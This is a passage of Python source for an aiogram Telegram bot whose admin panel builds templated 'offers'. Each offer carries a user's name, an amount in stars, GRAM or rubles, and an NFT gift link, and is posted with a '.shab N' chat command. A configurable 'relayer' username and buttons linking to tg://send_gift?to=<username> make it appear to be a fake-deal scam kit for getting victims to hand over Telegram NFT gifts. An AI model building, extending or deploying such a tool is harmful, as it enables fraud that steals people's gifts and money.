    "премиум-эмодзи). В названии кнопки <code>{e:ID}</code> задаёт иконку кнопки "
    "(Telegram показывает её слева от текста).\n"
    "• <b>Переменные</b> (работают в любых текстах, кнопках и алертах):\n"
    "  {v1} имя · {v2} число · {v3} звёзды/GRAM/рубли · {v4} текст-ссылка · {v5} константа\n"
    "  {v1}–{v3} выводятся жирным и с премиум-эмодзи в конце.\n"
    "• <b>Алерты</b>: до 200 символов, без форматирования.\n\n"
    "Чтобы узнать ID премиум-эмодзи — просто отправьте его боту в личку."
)

HINT_HTML = (
    "Отправьте юзернейм кому нужно будет передавать нфт. Он будет указан в инструкции."
)
HINT_LABEL = ("Отправьте название кнопки. Премиум-эмодзи: добавьте <code>{e:ID}</code> в конец. "
              "Можно использовать {v1}…{v5}.")
HINT_ALERT = "Отправьте текст алерта (до 200 символов, без форматирования). Можно использовать {v1}…{v5}."
HINT_PLAIN = "Отправьте простой текст без форматирования (подставляется вместо {v3})."
HINT_EMOJI = "Отправьте премиум-эмодзи (или его ID числом). «-» — убрать."
HINTS = {"html": HINT_HTML, "label": HINT_LABEL, "alert": HINT_ALERT, "plain": HINT_PLAIN}

# Постоянные значения: ключ -> (название, подсказка)
SET_TITLES = {
    "v5_html": ("Юзернейм кому передавать нфт", HINT_HTML + "\n«-» — очистить."),
    "link_url": ("Ссылка кнопок",
                 "Отправьте ссылку кому передавать нфт (tg://send_gift?to=юзернейм)."
                 ),
    "emoji_v1": ("Премиум-эмодзи после имени пользователя", HINT_EMOJI),
    "emoji_v2_stars": ("Премиум-эмодзи после суммы (нужен id эмодзи) (звёзды)", HINT_EMOJI),
    "emoji_v2_gram": ("Премиум-эмодзи после суммы (нужен id эмодзи) (GRAM)", HINT_EMOJI),
    "emoji_v2_rub": ("Премиум-эмодзи после суммы (нужен id эмодзи) (рубли)", HINT_EMOJI),
    "emoji_stars": ("Премиум-эмодзи после слова звёзды (нужен id эмодзи) (звёзды)", HINT_EMOJI),
    "emoji_gram": ("Премиум-эмодзи после слова gram (нужен id эмодзи) (GRAM)", HINT_EMOJI),
    "emoji_rub": ("Премиум-эмодзи после слова рублей (нужен id эмодзи)", HINT_EMOJI),
}

# Поля оффера: ключ -> (название, подсказка)
TPL_TITLES = {
    "amount": ("Сумма сделки", "Отправьте число (например 100)."),
    "v4_text": ("Отправьте название нфт, пример: Plush Pepe #1234", "Отправьте текст — он станет гиперссылкой. «-» — очистить."),
    "v4_url": ("Отправьте ссылку на нфт, пример: https://t.me/nft/PlushPepe-1234", "Отправьте ссылку (https://… или tg://…). «-» — без ссылки (будет просто текст)."),
}


async def show(target, text: str, markup=None) -> None:
    if isinstance(target, CallbackQuery):
        try:
            await target.message.edit_text(text, reply_markup=markup, link_preview_options=NO_PREVIEW)
        except TelegramBadRequest as e:
            if "not modified" not in str(e):
                await target.message.answer(text, reply_markup=markup, link_preview_options=NO_PREVIEW)
        await target.answer()
    else:
        await target.answer(text, reply_markup=markup, link_preview_options=NO_PREVIEW)


def short(value: str) -> str:
    plain = html.unescape(TAG_RE.sub("", value or ""))
    return html.escape(plain[:50]) or "—"


def card_text(n: str, tpl: dict) -> str:
    choice = tpl["v3_choice"]
    v3 = db.data["presets"][tpl["lang"]]["v3_" + choice]
    lines = [
        f"🧩 <b>Оффер №{n}</b> · {LANGS[tpl['lang']]}",
        "",
        "{v1} = имя (автоматически)",
        f"{{v2}} = {html.escape(tpl['amount']) or '—'}",
        f"{{v3}} = {html.escape(v3)} ({CHOICE_TITLES[choice]})",
        f"{{v4}} = {html.escape(tpl['v4_text']) or '—'} → {html.escape(tpl['v4_url']) or 'без ссылки'}",
        f"{{v5}} = {short(db.data['settings']['v5_html'])} (общая)",
        "",
        f"Команда в чате: <code>.shab {n}</code>",
    ]
    return "\n".join(lines)


def card_kb(n: str) -> InlineKeyboardMarkup:
    return kb(
        [("✏️ {v2} число", f"t:{n}:e:amount"), ("🔁 {v3}: звёзды ⇄ GRAM ⇄ рубли", f"t:{n}:v3")],
        [("✏️ {v4} текст", f"t:{n}:e:v4_text"), ("🔗 {v4} ссылка", f"t:{n}:e:v4_url")],
        [("🌐 Язык", f"t:{n}:lang")],
        [("👁 Превью", f"t:{n}:prev"), ("🗑 Удалить", f"t:{n}:del")],
        [("⬅️ Назад", "a:tpls")],
    )


def settings_text(user_id: int | None = None) -> str:
    st = db.data["settings"]
    if user_id is not None and not is_superadmin(user_id):
        return "\n".join(["🔧 <b>Настройки офферов</b>", "", f"Юзернейм кому передавать нфт: = {short(st['v5_html'])}", f"🔗 Ссылка кнопки передать нфт", f"Сейчас ведёт на: {html.escape(link_url())}"])
    mode = dict(NAME_MODES).get(st["name_mode"], "—")

    def e(key: str) -> str:
        return f"<code>{st[key]}</code>" if st[key] else "—"

    return "\n".join([
        "🔧 <b>Постоянные значения</b> (общие для всех языков)",
        "",
        f"{{v5}} = {short(st['v5_html'])}",
        f"🔗 Ссылка кнопок: {html.escape(st['link_url'])}",
        f"      сейчас ведёт на: {html.escape(link_url())}",
        "",
        f"Эмодзи после имени: {e('emoji_v1')}",
        f"Эмодзи после суммы (звёзды): {e('emoji_v2_stars')}",
        f"Эмодзи после суммы (GRAM): {e('emoji_v2_gram')}",
        f"Эмодзи после суммы (рубли): {e('emoji_v2_rub')}",
        f"Эмодзи после слова звёзды (звёзды): {e('emoji_stars')}",
        f"Эмодзи после gram (GRAM): {e('emoji_gram')}",
        f"Эмодзи после рублей: {e('emoji_rub')}",
        "",
        f"Имя для {{v1}} берётся: {mode}",
    ])


SETTINGS_KB = kb(
    [("✏️ юзернейм relayer", "s:e:v5_html"), ("🔗 Ссылка кнопок", "s:e:link_url")],
    [("😀 после имени", "s:e:emoji_v1")],
    [("😀 после суммы · звёзды", "s:e:emoji_v2_stars"), ("😀 после суммы · GRAM", "s:e:emoji_v2_gram")],
    [("😀 после суммы · рубли", "s:e:emoji_v2_rub")],
    [("⭐ звёзды", "s:e:emoji_stars"), ("💎 GRAM", "s:e:emoji_gram")],
    [("₽ Рубли", "s:e:emoji_rub")],
    [("👤 Сменить источник имени", "s:name")],
    [("⬅️ Назад", "a:menu")],
)
USER_SETTINGS_KB = kb(
    [("✏️ Изменить юзернейм", "s:e:v5_html"), ("🔗 Ссылка кнопок", "s:e:link_url")],
    [("⬅️ Назад", "a:menu")],
)


def settings_kb_for(user_id: int) -> InlineKeyboardMarkup:
    return SETTINGS_KB if is_superadmin(user_id) else USER_SETTINGS_KB


def current_value(target: str, key: str) -> str:
    if target == "help":
        return db.data["help_html"]
    if target == "set":
        return db.data["settings"][key]
    if target.startswith("pre:"):
        return db.data["presets"][target[4:]][key]
    return db.data["templates"][target[4:]][key]


def make_prompt(target: str, key: str) -> str:
    cur = html.escape(current_value(target, key))[:800] or "—"
    if target == "help":
        title, hint = "Сообщение .help", HINT_HTML
    elif target == "set":
        title, hint = SET_TITLES[key]
    elif target.startswith("tpl:"):
        title, hint = TPL_TITLES[key]
    else:
        title, hint = BLOCK_TITLE[key], HINTS[BLOCK_KIND[key]]
    return f"✏️ <b>{title}</b>\n\n{hint}\n\nСейчас:\n<pre>{cur}</pre>"


async def ask_value(cq: CallbackQuery, state: FSMContext, target: str, key: str, back_cb: str):
    await state.set_state(S.value)
    await state.update_data(target=target, key=key)
    await show(cq, make_prompt(target, key), kb([("✖️ Отмена", back_cb)]))


async def read_block(key: str, message: Message):
    """Значение блока из сообщения админа (html_text сохраняет форматирование)."""
    kind = BLOCK_KIND[key]
    if kind == "html":
        return message.html_text
    value = message.text.strip()
    if kind == "alert" and len(value) > 200:
        await message.answer("Алерт не длиннее 200 символов. Сократите и отправьте ещё раз.")
        return None
    return value


# ── меню ──
@admin.message(Command("admin"))
async def cmd_admin(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("⚙️ <b>Админ-панель</b>", reply_markup=main_kb_for(message.from_user.id))


@admin.message(Command("info"))
async def cmd_info_admin(message: Message):
    await message.answer(info_text(True))


@admin.callback_query(F.data == "a:menu")
async def a_menu(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await show(cq, "⚙️ <b>Админ-панель</b>", main_kb_for(cq.from_user.id))


@admin.callback_query(F.data == "a:syntax")
async def a_syntax(cq: CallbackQuery):
    await show(cq, SYNTAX_TEXT, kb([("⬅️ Назад", "a:menu")]))


# ── управление обычными администраторами (только супер-админ) ──
def admins_text() -> str:
    ids = sorted(get_admin_ids() - ({SUPERADMIN_ID} if SUPERADMIN_ID else set()))
    lines = ["👑 <b>Управление администраторами</b>", "", f"Суперадмин: <code>{SUPERADMIN_ID}</code>", ""]
    if ids:
        lines.extend(f"• <code>{uid}</code>" for uid in ids)
    else:
        lines.append("Обычных администраторов пока нет.")
    return "\n".join(lines)


@admin.callback_query(F.data == "a:admins")
async def a_admins(cq: CallbackQuery, state: FSMContext):
    if not is_superadmin(cq.from_user.id):
        return await cq.answer("Только суперадмин может управлять администраторами", show_alert=True)
    await state.clear()
    ids = sorted(get_admin_ids() - ({SUPERADMIN_ID} if SUPERADMIN_ID else set()))
    rows = [[(f"🗑 Удалить {uid}", f"a:admin_del:{uid}")] for uid in ids]
    rows += [[("➕ Добавить админа", "a:admin_add")], [("⬅️ Назад", "a:menu")]]
    await show(cq, admins_text(), kb(*rows))


@admin.callback_query(F.data == "a:admin_add")
async def a_admin_add(cq: CallbackQuery, state: FSMContext):
    if not is_superadmin(cq.from_user.id):
        return await cq.answer("Только суперадмин", show_alert=True)
    await state.set_state(S.admin_add)
    await show(cq, "Отправьте числовой Telegram ID пользователя, которого нужно сделать обычным администратором.", kb([("✖️ Отмена", "a:admins")]))


@admin.message(S.admin_add)
async def admin_add_message(message: Message, state: FSMContext):
    if not is_superadmin(message.from_user.id):
        await state.clear()
        return await message.answer("Недостаточно прав.")
    raw = (message.text or "").strip()
    if not raw.isdigit():
        return await message.answer("Нужен числовой Telegram ID. Например: <code>123456789</code>")
    uid = int(raw)
    if uid == SUPERADMIN_ID:
        return await message.answer("Этот пользователь уже суперадмин.")
    admins = set(get_admin_ids())
    if uid in admins:
        await state.clear()
        return await message.answer("Этот пользователь уже администратор.", reply_markup=kb([("⬅️ К администраторам", "a:admins")]))
    db.data.setdefault("admins", []).append(uid)
    db.data["admins"] = sorted(set(int(x) for x in db.data["admins"]))
    db.save()
    await state.clear()
    await message.answer(f"✅ Пользователь <code>{uid}</code> добавлен как обычный администратор.", reply_markup=kb([("⬅️ К администраторам", "a:admins")]))


@admin.callback_query(F.data.startswith("a:admin_del:"))
async def a_admin_del(cq: CallbackQuery, state: FSMContext):
    if not is_superadmin(cq.from_user.id):
        return await cq.answer("Только суперадмин", show_alert=True)
    try:
        uid = int(cq.data.rsplit(":", 1)[1])
    except ValueError:
        return await cq.answer("Некорректный ID", show_alert=True)
    db.data["admins"] = [int(x) for x in db.data.get("admins", []) if int(x) != uid]
    db.save()
    await state.clear()
    ids = sorted(get_admin_ids() - ({SUPERADMIN_ID} if SUPERADMIN_ID else set()))
    rows = [[(f"🗑 Удалить {x}", f"a:admin_del:{x}")] for x in ids]
    rows += [[("➕ Добавить админа", "a:admin_add")], [("⬅️ Назад", "a:menu")]]
    await show(cq, admins_text(), kb(*rows))


# ── .help ──
@admin.callback_query(F.data == "a:help")
async def a_help(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    text = "📖 <b>Текущее сообщение .help:</b>\n\n" + render_html(db.data["help_html"], {})
    await show(cq, text, kb([("✏️ Изменить", "a:helpedit")], [("⬅️ Назад", "a:menu")]))


@admin.callback_query(F.data == "a:helpedit")
async def a_help_edit(cq: CallbackQuery, state: FSMContext):
    await ask_value(cq, state, "help", "help", "a:help")


# ── постоянные значения ──
@admin.callback_query(F.data == "a:set")
async def a_set(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    await show(cq, settings_text(cq.from_user.id), settings_kb_for(cq.from_user.id))


@admin.callback_query(F.data.startswith("s:"))
async def settings_cb(cq: CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    if not is_superadmin(cq.from_user.id) and not (len(parts) == 3 and parts[1] == "e" and parts[2] in {"v5_html", "link_url"}):
        return await cq.answer("Недостаточно прав", show_alert=True)
    if parts[1] == "e" and parts[2] in SET_TITLES:
        await ask_value(cq, state, "set", parts[2], "a:set")
    elif parts[1] == "name":
        st = db.data["settings"]
        modes = [m for m, _ in NAME_MODES]
        cur = modes.index(st["name_mode"]) if st["name_mode"] in modes else -1
        st["name_mode"] = modes[(cur + 1) % len(modes)]
        db.save()
        await show(cq, settings_text(cq.from_user.id), settings_kb_for(cq.from_user.id))
    else:
        await cq.answer()


# ── список офферов и мастер создания ──
WIZ = ["number", "lang", "amount", "v3", "v4_text", "v4_url"]
WIZ_PROMPTS = {
    "number": "Введите номер оффера",
    "amount": "Сумма сделки (например 100).",
    "v4_text": "Название подарка. Пример: Plush Pepe #1234",
    "v4_url": "Ссылка на подарок. Пример: https://t.me/nft/PlushPepe-1234",
}


def next_free_number() -> str:
    return str(max([int(k) for k in db.data["templates"]] or [0]) + 1)


@admin.callback_query(F.data == "a:tpls")
async def a_tpls(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    items = sorted(db.data["templates"].items(), key=lambda x: int(x[0]))
    if is_superadmin(cq.from_user.id):
        rows = [[(f"№{n} · {LANGS[t['lang']]}", f"t:{n}")] for n, t in items]
        rows += [[("➕ Создать оффер", "a:new")], [("⬅️ Назад", "a:menu")]]
        body = "🧩 <b>Офферы</b>" + ("" if items else "\nПока пусто.")
    else:
        rows = [[(f"№{n} · {LANGS[t['lang']]}", f"t:{n}")] for n, t in items]
        rows += [[("➕ Создать оффер", "a:new")], [("⬅️ Назад", "a:menu")]]
        body = "🧩 <b>Офферы</b>" + ("" if items else "\nПока пусто.") + "\nВыберите оффер, чтобы открыть информацию и превью."
    await show(cq, body, kb(*rows))


async def wiz_step(msg: Message, state: FSMContext, draft: dict, i: int):
    if i >= len(WIZ):
        n = draft["number"]
        tpl = new_template(draft["lang"])
        tpl.update(amount=draft["amount"], v3_choice=draft["v3_choice"],
                   v4_text=draft["v4_text"], v4_url=draft["v4_url"])
        db.data["templates"][n] = tpl
        db.save()
        await state.clear()
        await msg.answer(
            f"✅ Оффер №{n} создан.\n\n" + card_text(n, tpl),
            reply_markup=card_kb(n),
        )
        return
    await state.update_data(i=i, draft=draft)
    step = WIZ[i]
    if step == "lang":
        rows = [[(name, f"a:wlang:{code}")] for code, name in LANGS.items()]
        await msg.answer("Выберите язык постоянного оффера:", reply_markup=kb(*rows))
    elif step == "v3":
        await msg.answer("Выберите валюту сделки:",
                         reply_markup=kb([("⭐ Звёзды", "a:wchoice:stars"), ("💎 GRAM", "a:wchoice:gram"), ("₽ Рубли", "a:wchoice:rub")]))
    else:
        await msg.answer(f"<b>Шаг {i + 1}/{len(WIZ)}.</b> {WIZ_PROMPTS[step]}\n\n<i>Отмена — /admin</i>")


@admin.callback_query(F.data == "a:new")
async def a_new(cq: CallbackQuery, state: FSMContext):
    draft = {"number": "", "lang": "ru", "amount": "", "v3_choice": "stars", "v4_text": "", "v4_url": ""}
    await state.set_state(S.wiz)
    await cq.answer()
    await wiz_step(cq.message, state, draft, 0)


@admin.callback_query(S.wiz, F.data.startswith("a:wlang:"))
async def wiz_lang(cq: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    lang = cq.data.split(":")[2]
    if WIZ[d["i"]] != "lang" or lang not in LANGS:
        return await cq.answer()
    d["draft"]["lang"] = lang
    await cq.answer()
    await wiz_step(cq.message, state, d["draft"], d["i"] + 1)


@admin.callback_query(S.wiz, F.data.startswith("a:wchoice:"))
async def wiz_choice(cq: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    choice = cq.data.split(":")[2]
    if WIZ[d["i"]] != "v3" or choice not in CHOICE_TITLES:
        return await cq.answer()
    d["draft"]["v3_choice"] = choice
    await cq.answer()
    await wiz_step(cq.message, state, d["draft"], d["i"] + 1)


@admin.message(S.wiz)
async def wiz_message(message: Message, state: FSMContext):
    d = await state.get_data()
    i, draft = d["i"], d["draft"]
    step = WIZ[i]
    if step in ("lang", "v3"):
        return await message.answer("Выберите вариант кнопкой выше.")
    if not message.text:
        return await message.answer("Нужен текстовый ответ.")
    text = message.text.strip()
    skip = text == "-"

    if step == "number":
        if skip:
            number = next_free_number()
        elif text.isdigit():
            number = str(int(text))
        else:
            return await message.answer("Нужно число. Попробуйте ещё раз.")
        if number in db.data["templates"]:
            return await message.answer("Оффер с таким номером уже есть. Введите другой номер.")
        draft["number"] = number
    elif step == "amount":
        if skip:
            draft["amount"] = ""
        elif AMOUNT_RE.match(text):
            draft["amount"] = text
        else:
            return await message.answer("Нужно число (например 100) или «-», чтобы пропустить.")
    elif step == "v4_text":
        draft["v4_text"] = "" if skip else text
    elif step == "v4_url":
        if not skip and not URL_RE.match(text):
            return await message.answer("Нужна ссылка вида https://… или tg://…")
        draft["v4_url"] = "" if skip else text
    await wiz_step(message, state, draft, i + 1)


# ── карточка оффера и действия над ним ──
@admin.callback_query(F.data.startswith("t:"))
async def tpl_cb(cq: CallbackQuery, state: FSMContext, bot: Bot):
    parts = cq.data.split(":")
    n = parts[1]
    act = parts[2] if len(parts) > 2 else "card"
    tpl = db.data["templates"].get(n)
    if not tpl:
        return await cq.answer("Оффер не найден", show_alert=True)

    if act == "card":
        await state.clear()
        await show(cq, card_text(n, tpl), card_kb(n))
    elif act == "e" and parts[3] in TPL_TITLES:  # число / текст {v4} / ссылка {v4}
        await ask_value(cq, state, f"tpl:{n}", parts[3], f"t:{n}")
    elif act == "v3":  # переключатель звёзды ⇄ GRAM ⇄ рубли
        tpl["v3_choice"] = {"stars": "gram", "gram": "rub", "rub": "stars"}.get(tpl["v3_choice"], "stars")
        db.save()
        await show(cq, card_text(n, tpl), card_kb(n))
    elif act == "lang":
        rows = [[(name, f"t:{n}:sl:{code}")] for code, name in LANGS.items()]
        rows.append([("⬅️ Назад", f"t:{n}")])
        await show(cq, "Выберите язык постоянного оффера:", kb(*rows))
    elif act == "sl":
        if parts[3] in LANGS:
            tpl["lang"] = parts[3]
            db.save()
        await show(cq, card_text(n, tpl), card_kb(n))
    elif act == "prev":
        name = pick_name(db.data["settings"]["name_mode"], cq.from_user, cq.message.chat)
        text, markup = build_screen(n, tpl, "main", name, icons=True)
        rows = list(markup.inline_keyboard) if markup else []
        rows.append([InlineKeyboardButton(text="⬅️ Назад к офферу", callback_data=f"t:{n}")])
        preview_markup = InlineKeyboardMarkup(inline_keyboard=rows)
        await show(cq, f"👁 <b>Превью оффера №{n}</b>\n\n{text}", preview_markup)
    elif act == "del":
        await show(cq, f"Удалить оффер №{n}?", kb([("🗑 Да, удалить", f"t:{n}:delok"), ("✖️ Отмена", f"t:{n}")]))
    elif act == "delok":
        db.data["templates"].pop(n, None)
        db.save()
        await a_tpls(cq, state)
    else:
        await cq.answer()


# ── постоянные офферы (тексты по языкам) ──
@admin.callback_query(F.data == "a:pres")
async def a_pres(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    rows = [[(name, f"p:{code}")] for code, name in LANGS.items()] + [[("⬅️ Назад", "a:menu")]]
    await show(cq, "🗂 <b>Постоянные офферы</b>\nВыберите язык. Эти тексты общие для всех офферов "
                   "этого языка; в них используются переменные {v1}…{v5}.", kb(*rows))


@admin.callback_query(F.data.startswith("p:"))
async def preset_cb(cq: CallbackQuery, state: FSMContext):
    parts = cq.data.split(":")
    lang = parts[1]
    if lang not in LANGS:
        return await cq.answer()
    if len(parts) == 2:
        await state.clear()
        rows = [[(title, f"p:{lang}:{idx}")] for idx, (_, title, _) in enumerate(BLOCKS)]
        rows.append([("⬅️ Назад", "a:pres")])
        await show(cq, f"🗂 <b>{LANGS[lang]}</b> — выберите блок:", kb(*rows))
    else:
        key = BLOCKS[int(parts[2])][0]
        await ask_value(cq, state, f"pre:{lang}", key, f"p:{lang}")


# ── приём нового значения от админа ──
@admin.message(S.value)
async def on_value(message: Message, state: FSMContext):
    d = await state.get_data()
    target, key = d.get("target"), d.get("key")
    if not is_superadmin(message.from_user.id) and not (target == "set" and key in {"v5_html", "link_url"}):
        await state.clear()
        return await message.answer("Недостаточно прав для изменения этого раздела.")
    if not message.text:
        return await message.answer("Нужен текст.")
    text = message.text.strip()
    clear = text == "-"

    if target == "help":
        db.data["help_html"] = message.html_text
        back = "a:help"
    elif target == "set":
        st = db.data["settings"]
        back = "a:set"
        if key == "v5_html":
            st[key] = "" if clear else message.html_text
        elif key == "link_url":
            if not URL_RE.match(text.replace("{v5}", "x")):
                return await message.answer("Нужна ссылка вида https://… или tg://…")
            st[key] = text
        else:  # emoji_*
            if clear:
                st[key] = ""
            else:
                ids = [e.custom_emoji_id for e in (message.entities or []) if e.type == "custom_emoji"]
                if ids:
                    st[key] = ids[0]
                elif text.isdigit():
                    st[key] = text
                else:
                    return await message.answer("Отправьте премиум-эмодзи или его ID (число).")
    elif target.startswith("pre:"):
        lang = target[4:]
        if clear:
            return await message.answer("В постоянном оффере блок нельзя очистить — отправьте новый текст.")
        value = await read_block(key, message)
        if value is None:
            return
        db.data["presets"][lang][key] = value
        back = f"p:{lang}"
    else:  # tpl:<n>
        n = target[4:]
        tpl = db.data["templates"][n]
        back = f"t:{n}"
        if key == "amount":
            if not AMOUNT_RE.match(text):
                return await message.answer("Нужно число (например 100).")
            tpl["amount"] = text
        elif key == "v4_text":
            tpl["v4_text"] = "" if clear else text
        elif key == "v4_url":
            if not clear and not URL_RE.match(text):
                return await message.answer("Нужна ссылка вида https://… или tg://…")
            tpl["v4_url"] = "" if clear else text

    db.save()
    await state.clear()
    await message.answer("✅ Сохранено.", reply_markup=kb([("⬅️ Назад", back)]))


# ── вспомогательное: ID премиум-эмодзи ──
def has_custom_emoji(m: Message) -> bool:
    return any(e.type == "custom_emoji" for e in (m.entities or []))


@admin.message(StateFilter(None), has_custom_emoji)
async def emoji_ids(message: Message):
    ids = [e.custom_emoji_id for e in message.entities if e.type == "custom_emoji"]
    await message.answer("ID премиум-эмодзи:\n" + "\n".join(f"<code>{i}</code>" for i in ids))


# ───────────────────────────── Запуск ─────────────────────────────
async def health(request: web.Request) -> web.Response:
    return web.Response(text="ok")


def main() -> None:
    if not BOT_TOKEN or not SUPERADMIN_ID:
        raise SystemExit("Задайте BOT_TOKEN и SUPERADMIN_ID (Telegram ID единственного суперадмина).")
    bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_routers(admin, public)

    if WEBHOOK_BASE:  # Render: webhook
        async def on_startup(bot: Bot) -> None:
            await bot.set_webhook(
                f"{WEBHOOK_BASE}{WEBHOOK_PATH}",
                secret_token=WEBHOOK_SECRET,
                allowed_updates=dp.resolve_used_update_types(),
            )
            log.info("Webhook установлен: %s%s", WEBHOOK_BASE, WEBHOOK_PATH)

        dp.startup.register(on_startup)
        app = web.Application()
        app.router.add_get("/", health)
        SimpleRequestHandler(dispatcher=dp, bot=bot, secret_token=WEBHOOK_SECRET).register(
            app, path=WEBHOOK_PATH
        )
        setup_application(app, dp, bot=bot)
        web.run_app(app, host="0.0.0.0", port=PORT)
    else:  # локально: polling
        async def polling() -> None:
            await bot.delete_webhook(drop_pending_updates=True)
            await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

        asyncio.run(polling())


if __name__ == "__main__":
    main()

